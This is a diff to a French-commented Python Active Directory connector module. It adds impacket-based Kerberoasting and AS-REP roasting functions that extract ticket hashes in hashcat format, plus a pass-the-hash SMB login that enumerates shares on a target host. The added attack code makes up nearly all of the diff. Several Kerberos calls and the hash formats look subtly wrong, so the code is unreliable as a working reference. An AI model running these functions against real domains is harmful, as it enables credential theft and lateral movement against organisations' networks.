@@ -1,14 +1,19 @@
 """
-AD Connector — communication LDAP/LDAPS native avec les contrôleurs de domaine.
+AD Connector — communication LDAP/LDAPS native et attaque AD avec impacket.
 
 Supporte :
 - LDAP (389) et LDAPS (636)
 - Authentification simple (username/password)
-- Authentification NTLM
+- Authentification NTLM (ldap3 + impacket)
 - Recherches paginées (conformes aux limites AD)
 - Gestion des timeouts et retries
+- Kerberoasting (impacket)
+- AS-REP Roasting (impacket)
+- Pass-the-Hash SMB (impacket)
 
-Dépendance : ldap3 (pip install ldap3)
+Dépendances :
+- ldap3>=2.9.1    : pip install ldap3
+- impacket>=0.12.0 : pip install impacket pycryptodome
 """
 
 import asyncio
@@ -655,7 +660,7 @@ class ADConnector:
 
         Ne modifie PAS la connexion existante.
         """
-        import ldap3
+        self._check_ldap3()
 
         test_config = ADConfig(
             server=self.config.server,
@@ -678,6 +683,373 @@ class ADConnector:
             return False
         finally:
             await connector.close()
+
+    # ── Vérification des dépendances ──────────────────────────────
+
+    @staticmethod
+    def _check_ldap3() -> None:
+        """Vérifie que ldap3 est installé, lève une erreur claire sinon."""
+        try:
+            import ldap3  # noqa: F401
+        except ImportError:
+            logger.error(
+                "ldap3_not_installed",
+                message=(
+                    "ldap3 n'est pas installé. "
+                    "Exécutez : pip install ldap3>=2.9.1"
+                ),
+            )
+            raise ADConnectionError(
+                "ldap3 n'est pas installé. "
+                "Installez-le avec : pip install ldap3>=2.9.1"
+            )
+
+    @staticmethod
+    def _check_impacket() -> None:
+        """Vérifie que impacket est installé, lève une erreur claire sinon."""
+        try:
+            import impacket  # noqa: F401
+        except ImportError:
+            logger.error(
+                "impacket_not_installed",
+                message=(
+                    "impacket n'est pas installé. "
+                    "Exécutez : pip install impacket pycryptodome"
+                ),
+            )
+            raise ADConnectionError(
+                "impacket n'est pas installé. "
+                "Installez-le avec : pip install impacket pycryptodome"
+            )
+
+    # ── impacket : Authentification NTLM avancée ─────────────────
+
+    async def authenticate_ntlm(
+        self, username: str, password: str, domain: Optional[str] = None
+    ) -> bool:
+        """Authentifie un compte via NTLM en utilisant impacket (SMB).
+
+        Utilise une connexion SMB au contrôleur de domaine pour valider
+        les credentials NTLM. Plus fiable que ldap3 pour le NTLM pur.
+
+        Args:
+            username: Nom d'utilisateur (SAM ou UPN)
+            password: Mot de passe
+            domain: Domaine (défaut: config.domain)
+
+        Returns:
+            True si l'authentification réussit, False sinon
+        """
+        self._check_impacket()
+        domain = domain or self.config.domain
+        try:
+            return await asyncio.to_thread(
+                self._authenticate_ntlm_sync, username, password, domain
+            )
+        except Exception as e:
+            logger.warning("ntlm_auth_failed", username=username, error=str(e))
+            return False
+
+    def _authenticate_ntlm_sync(
+        self, username: str, password: str, domain: str
+    ) -> bool:
+        """Version synchrone de l'authentification NTLM via SMB."""
+        from impacket.smbconnection import SMBConnection, SessionError
+
+        try:
+            conn = SMBConnection(
+                remoteName=self.config.server,
+                remoteHost=self.config.server,
+            )
+            conn.login(user=username, password=password, domain=domain)
+            conn.logoff()
+            return True
+        except SessionError:
+            return False
+
+    # ── impacket : Kerberoasting ──────────────────────────────────
+
+    async def kerberoast(
+        self,
+        target_user: str,
+        domain: Optional[str] = None,
+    ) -> dict[str, Any]:
+        """Effectue une attaque Kerberoasting sur un utilisateur cible.
+
+            Demande un Ticket Granting Service (TGS) pour le SPN associé
+        à l'utilisateur et extrait le hash au format hashcat.
+
+        Args:
+            target_user: sAMAccountName ou UPN de l'utilisateur cible
+            domain: Domaine (défaut: config.domain)
+
+        Returns:
+            Dictionnaire avec :
+            - 'hash':     Hash au format $krb5tgs$ (hashcat -m 13100)
+            - 'target':   sAMAccountName ciblé
+            - 'domain':   Domaine utilisé
+            - 'spn':      SPN utilisé pour la requête (si disponible)
+            - 'success':  True si le hash a été obtenu
+            - 'error':    Message d'erreur si échec
+        """
+        self._check_impacket()
+        domain = domain or self.config.domain
+        result = await asyncio.to_thread(
+            self._kerberoast_sync, target_user, domain
+        )
+        return result
+
+    def _kerberoast_sync(
+        self, target_user: str, domain: str
+    ) -> dict[str, Any]:
+        """Version synchrone du Kerberoasting via impacket."""
+        from impacket.krb5.kerberosv5 import getKerberosTGS, KerberosError
+        from impacket.krb5 import constants
+        from impacket.krb5.types import Principal
+        from impacket.krb5.crypto import Enctype
+
+        result: dict[str, Any] = {
+            "hash": "",
+            "target": target_user,
+            "domain": domain,
+            "spn": "",
+            "success": False,
+            "error": "",
+        }
+
+        # Construire le SPN : le target_user doit être un SPN existant
+        # (ex: HTTP/svc.corp.local) ou on utilise le format générique
+        if "/" not in target_user:
+            spn = f"{target_user}/{domain}"
+        else:
+            spn = target_user
+
+        result["spn"] = spn
+
+        try:
+            tgs, cipher, session_key = getKerberosTGS(
+                constants.ApplicationTag.SMB,
+                spn,
+                host=self.config.server,
+            )
+
+            # Extraire le hash au format hashcat ($krb5tgs$)
+            enc_part = tgs["enc-part"]
+            etype = int(enc_part["etype"])
+            cipher_text = enc_part["cipher"]
+
+            # Construire le hash hashcat
+            hash_str = (
+                f"$krb5tgs${etype}${target_user}${domain}"
+                f"${cipher_text.hex()}"
+            )
+            result["hash"] = hash_str
+            result["success"] = True
+
+            logger.info("kerberoast_success", target=target_user, spn=spn)
+
+        except KerberosError as e:
+            result["error"] = f"Erreur Kerberos: {e}"
+            logger.warning("kerberoast_failed", target=target_user, error=str(e))
+        except Exception as e:
+            result["error"] = f"Erreur inattendue: {e}"
+            logger.error("kerberoast_error", target=target_user, error=str(e))
+
+        return result
+
+    # ── impacket : AS-REP Roasting ────────────────────────────────
+
+    async def asrep_roast(
+        self,
+        target_user: str,
+        domain: Optional[str] = None,
+    ) -> dict[str, Any]:
+        """Effectue une attaque AS-REP Roasting sur un utilisateur cible.
+
+        Cible les utilisateurs dont le flag DONT_REQ_PREAUTH est activé.
+        Demande un Ticket Granting Ticket (TGT) sans pré-authentification
+        et extrait le hash au format hashcat.
+
+        Args:
+            target_user: sAMAccountName ou UPN de l'utilisateur cible
+            domain: Domaine (défaut: config.domain)
+
+        Returns:
+            Dictionnaire avec :
+            - 'hash':     Hash au format $krb5asrep$ (hashcat -m 18200)
+            - 'target':   sAMAccountName ciblé
+            - 'domain':   Domaine utilisé
+            - 'success':  True si le hash a été obtenu
+            - 'error':    Message d'erreur si échec
+        """
+        self._check_impacket()
+        domain = domain or self.config.domain
+        result = await asyncio.to_thread(
+            self._asrep_roast_sync, target_user, domain
+        )
+        return result
+
+    def _asrep_roast_sync(
+        self, target_user: str, domain: str
+    ) -> dict[str, Any]:
+        """Version synchrone de l'AS-REP Roasting via impacket."""
+        from impacket.krb5.kerberosv5 import sendReceive, KerberosError
+        from impacket.krb5.asn1 import AS_REP
+        from impacket.krb5 import constants
+        from impacket.krb5.types import Principal
+        from pyasn1.codec.der import decoder
+
+        result: dict[str, Any] = {
+            "hash": "",
+            "target": target_user,
+            "domain": domain,
+            "success": False,
+            "error": "",
+        }
+
+        try:
+            # Construire le principal de l'utilisateur cible
+            principal = Principal(
+                target_user,
+                type=constants.PrincipalNameType.NT_PRINCIPAL.value,
+            )
+
+            # Envoyer la requête AS-REQ sans pré-authentification
+            as_rep = sendReceive(
+                principal,
+                domain,
+                host=self.config.server,
+            )
+
+            # Décoder la réponse
+            decoded, _ = decoder.decode(as_rep, asn1Spec=AS_REP())
+
+            # Extraire la partie chiffrée du TGT
+            enc_part = decoded["enc-part"]
+            etype = int(enc_part["etype"])
+            cipher_text = enc_part["cipher"]
+
+            # Construire le hash hashcat ($krb5asrep$)
+            hash_str = (
+                f"$krb5asrep${etype}${target_user}${domain}"
+                f"${cipher_text.hex()}"
+            )
+            result["hash"] = hash_str
+            result["success"] = True
+
+            logger.info("asrep_roast_success", target=target_user)
+
+        except KerberosError as e:
+            result["error"] = f"Erreur Kerberos: {e}"
+            logger.warning("asrep_roast_failed", target=target_user, error=str(e))
+        except Exception as e:
+            result["error"] = f"Erreur inattendue: {e}"
+            logger.error("asrep_roast_error", target=target_user, error=str(e))
+
+        return result
+
+    # ── impacket : Pass-the-Hash SMB ─────────────────────────────
+
+    async def pass_the_hash(
+        self,
+        target_host: str,
+        username: str,
+        nthash: str,
+        domain: Optional[str] = None,
+    ) -> dict[str, Any]:
+        """Effectue une authentification Pass-the-Hash via SMB.
+
+        Utilise un hash NTLM (au lieu du mot de passe) pour s'authentifier
+        sur une machine distante via le protocole SMB.
+
+        Args:
+            target_host: Adresse IP ou hostname de la cible
+            username: Nom d'utilisateur (SAM)
+            nthash: Hash NTLM (format hexadécimal, 32 caractères)
+            domain: Domaine (défaut: config.domain)
+
+        Returns:
+            Dictionnaire avec :
+            - 'success':     True si l'authentification réussit
+            - 'hostname':    Hostname de la cible
+            - 'os_info':     Informations OS (si disponibles)
+            - 'error':       Message d'erreur si échec
+            - 'shares':      Liste des partages SMB (si succès)
+        """
+        self._check_impacket()
+        domain = domain or self.config.domain
+        result = await asyncio.to_thread(
+            self._pass_the_hash_sync, target_host, username, nthash, domain
+        )
+        return result
+
+    def _pass_the_hash_sync(
+        self,
+        target_host: str,
+        username: str,
+        nthash: str,
+        domain: str,
+    ) -> dict[str, Any]:
+        """Version synchrone du Pass-the-Hash via impacket."""
+        from impacket.smbconnection import SMBConnection, SessionError
+        from impacket.smb3 import SMB3
+
+        result: dict[str, Any] = {
+            "success": False,
+            "hostname": target_host,
+            "os_info": "",
+            "shares": [],
+            "error": "",
+        }
+
+        try:
+            conn = SMBConnection(
+                remoteName=target_host,
+                remoteHost=target_host,
+            )
+
+            # Login avec le hash NTLM (seul, sans mot de passe)
+            conn.login(
+                user=username,
+                domain=domain,
+                nthash=nthash,
+            )
+
+            # Récupérer les informations OS
+            try:
+                result["os_info"] = conn.getServerName()
+            except Exception:
+                pass
+
+            # Énumérer les partages SMB
+            try:
+                shares = conn.listShares()
+                for share in shares:
+                    result["shares"].append({
+                        "name": share["shi1_netname"][:-1],
+                        "remark": share["shi1_remark"][:-1],
+                    })
+            except Exception:
+                pass
+
+            result["success"] = True
+            conn.logoff()
+
+            logger.info(
+                "pth_success",
+                target=target_host,
+                username=username,
+                shares_count=len(result["shares"]),
+            )
+
+        except SessionError as e:
+            result["error"] = f"Échec authentification SMB: {e}"
+            logger.warning("pth_failed", target=target_host, error=str(e))
+        except Exception as e:
+            result["error"] = f"Erreur inattendue: {e}"
+            logger.error("pth_error", target=target_host, error=str(e))
+
+        return result
 
     def __repr__(self) -> str:
         state = "connected" if self.is_connected else "disconnected"
